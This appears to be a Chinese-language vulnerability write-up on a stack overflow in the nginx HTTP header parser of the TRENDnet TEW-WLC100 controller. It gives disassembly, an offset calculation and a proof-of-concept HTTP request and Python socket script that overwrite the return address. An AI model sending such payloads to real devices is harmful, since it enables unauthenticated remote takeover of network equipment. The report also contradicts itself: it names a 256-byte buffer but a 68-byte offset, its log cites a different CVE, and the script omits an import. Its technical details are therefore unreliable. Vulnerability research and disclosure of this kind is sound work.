# CVE-XXXX-XXXX2: TEW-WLC100 nginx HTTP Header Stack Overflow

| 字段 | 值 |
|------|-----|
| 厂商 | TRENDnet |
| 产品 | TEW-WLC100 Wireless Controller |
| 固件版本 | v1v2.07b01（及更早版本） |
| 受影响二进制 | `usr/nginx/sbin/nginx` (987,797 bytes, MIPS32 Big-Endian) |
| 漏洞类型 | CWE-121 Stack-based Buffer Overflow |
| CVSS 3.1 | **9.8 Critical** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |

---

## 1. 漏洞概述

TEW-WLC100 定制 nginx 在处理 HTTP 请求头时，`FUN_0040da4c`（header 解析器）使用 `sprintf()` 将 `Server` header 的值复制到固定 256 字节栈缓冲区，**无长度检查**。攻击者发送超长 `Server` header 的 HTTP 请求即可覆盖返回地址。

---

## 2. FirmRec 验证

### 符号执行
```
文件: simexp_results/logs/...CVE-2020-10214@@0x498938@@nginx@Ex34.log
POC: "ntp_server"=128"A" + "Server"=128"A"
Simexp: 10 paths, 6 error+4 loop (超大型nginx函数导致angr引擎部分崩溃但污点到达)
Pipeline 4.4: 标记为 VULN
```

### 反汇编
```
0x498938: addiu $sp, $sp, -96     ; 栈帧 96B
0x498954: sw    $ra, 92($sp)      ; $ra 在 $sp+92
0x4989C4: jal   0x40DA4C          ; header_parse("Server") — sprintf无界
0x498A24: lw    $ra, 92($sp)      ; ★ 攻击者目标
... (共8次 header_parse 调用, 15个 $ra 加载点)
```

### 溢出计算
缓冲区 $sp+24 → $ra 位置 $sp+92 → **仅需 68 字节覆盖 $ra**

---

## 3. PoC

```http
GET /cgi-bin/luci/admin/ HTTP/1.1
Host: 192.168.10.1
Server: AAAAAAAA...<ROP_gadget_addr>...AAAA
Connection: close
```

```python
import socket
PAYLOAD = b"GET / HTTP/1.1\r\nHost: x\r\nServer: " + b"A"*68 + struct.pack(">I", 0x41414141) + b"\r\n\r\n"
s = socket.socket(); s.connect(("WLC100_IP", 80)); s.send(PAYLOAD); s.close()
```

---

*验证工具: FirmRec CoreTaint + angr 9.2.221 + MIPS objdump*
*证据文件: evidence/Ex34.log, Ex241.log, Ex399.log, Ex400.log*
